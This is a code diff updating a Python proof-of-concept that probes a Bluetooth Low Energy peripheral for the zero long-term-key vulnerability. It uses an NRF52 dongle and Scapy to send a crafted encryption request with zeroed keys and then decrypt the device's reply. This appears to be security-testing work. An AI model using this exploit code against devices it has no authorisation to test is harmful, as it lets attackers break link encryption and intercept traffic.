@@ -12,7 +12,7 @@ from colorama import Fore
 from drivers.NRF52_dongle import NRF52Dongle
 from scapy.layers.bluetooth4LE import *
 from scapy.layers.bluetooth import *
-from scapy.utils import raw
+from scapy.compat import raw
 from timeout_lib import start_timeout, disable_timeout, update_timeout
 from Crypto.Cipher import AES
 
@@ -52,22 +52,9 @@ fragment = None
 # Autoreset colors
 colorama.init(autoreset=True)
 
-# Get serial port from command line
-if len(sys.argv) >= 2:
-    serial_port = sys.argv[1]
-elif platform.system() == 'Linux':
-    serial_port = '/dev/ttyACM0'
-elif platform.system() == 'Windows':
-    serial_port = 'COM1'
-else:
-    print(Fore.RED + 'Platform not identified')
-    sys.exit(0)
-
-print(Fore.YELLOW + 'Serial port: ' + serial_port)
-
 # Get advertiser_address from command line (peripheral addr)
-if len(sys.argv) >= 3:
-    advertiser_address = sys.argv[2].upper()
+if len(sys.argv) >= 2:
+    advertiser_address = sys.argv[1].upper()
 else:
     advertiser_address = 'A4:C1:38:D8:AD:B8'
 
@@ -105,8 +92,8 @@ def smp_timeout():
 def set_security_settings(pkt):
     global paring_auth_request
     # Change security parameters according to slave security request
-    # paring_auth_request = pkt[SM_Security_Request].authentication
-    print(Fore.YELLOW + 'Slave requested authentication of ' + hex(pkt[SM_Security_Request].authentication))
+    # paring_auth_request = pkt[SM_Pairing_Request].authentication
+    print(Fore.YELLOW + 'Slave requested authentication of ' + hex(pkt[SM_Pairing_Request].authentication))
     print(Fore.YELLOW + 'We are using authentication of ' + hex(paring_auth_request))
 
 
@@ -133,7 +120,7 @@ def send_encrypted(pkt):
 
         enc_pkt, mic = aes.encrypt_and_digest(raw_pkt[6:-3])  # get payload and exclude 3 bytes of crc
         conn_tx_packet_counter += 1  # Increment packet counter
-        driver.raw_send(access_address + chr(header) + chr(length) + enc_pkt + mic + crc)
+        driver.send(access_address + chr(header) + chr(length) + enc_pkt + mic + crc)
         print(Fore.CYAN + "TX ---> [Encrypted]{" + pkt.summary()[7:] + '}')
     except Exception as e:
         print(Fore.RED + "Encryption problem: " + e)
@@ -195,7 +182,7 @@ def defragment_l2cap(pkt):
 
 
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='zero_ltk_capture.pcap')
+driver = NRF52Dongle(logs_pcap=True, pcap_filename='zero_ltk_capture.pcap')
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
     ScanA=master_address,
@@ -231,7 +218,7 @@ while run_script:
             update_timeout('scan_timeout')
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
-        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
+        if (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
             connecting = True
             update_timeout('scan_timeout')
             disable_timeout('crash_timeout')
@@ -262,18 +249,18 @@ while run_script:
         elif BTLE_DATA in pkt and connecting == True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
-            if SM_Security_Request in pkt:
+            if SM_Pairing_Request in pkt:
                 set_security_settings(pkt)
             # Send Feature request
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_FEATURE_REQ(
                 feature_set='le_encryption+le_data_len_ext')
             driver.send(pkt)
 
-        elif SM_Security_Request in pkt:
+        elif SM_Pairing_Request in pkt:
             set_security_settings(pkt)
 
         elif LL_FEATURE_RSP in pkt:
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_LENGTH_REQ(
                 max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
             driver.send(pkt)
 
@@ -284,7 +271,7 @@ while run_script:
 
         elif ATT_Exchange_MTU_Response in pkt:
             # Send version indication request
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_VERSION_IND(version='4.2')
             driver.send(pkt)
 
         elif LL_VERSION_IND in pkt:
@@ -311,10 +298,7 @@ while run_script:
             conn_iv = b'\x00' * 4  # set IVm (IV of master)
             conn_skd = b'\x00' * 8  # set SKDm (session key diversifier part of master)
             enc_request = BTLE(
-                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv=b'\x00',
-                                                                                   rand=b'\x00',
-                                                                                   skdm=conn_iv,
-                                                                                   ivm=conn_skd)
+                access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_ENC_REQ(skdm=conn_iv, ivm=conn_skd)
             driver.send(enc_request)  # Send the malicious packet (2/2)
 
         elif LL_ENC_RSP in pkt:
@@ -341,7 +325,7 @@ while run_script:
             # further pairings. Peripheral SMP gets back to normal after user restarts manually the device
             # end_connection = True # (Uncomment here)
             encryption_enabled = True
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_START_ENC_RSP()
             send_encrypted(pkt)
 
         elif LL_START_ENC_RSP in pkt:
@@ -349,7 +333,7 @@ while run_script:
                     Fore.RED + 'Oooops, we were able to decrypt an encrypted response from the peripheral using a zero LTK\n'
                                'Zero LTK vulnerability is present. Check the zero_ltk.pcpap file for more information')
             end_connection = True
-            driver.save_pcap()
+            #driver.save_pcap()
             exit(0)
 
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
@@ -371,4 +355,5 @@ while run_script:
 
     sleep(0.01)
 
+driver.save_pcap()
 print(Fore.YELLOW + 'Script ended')
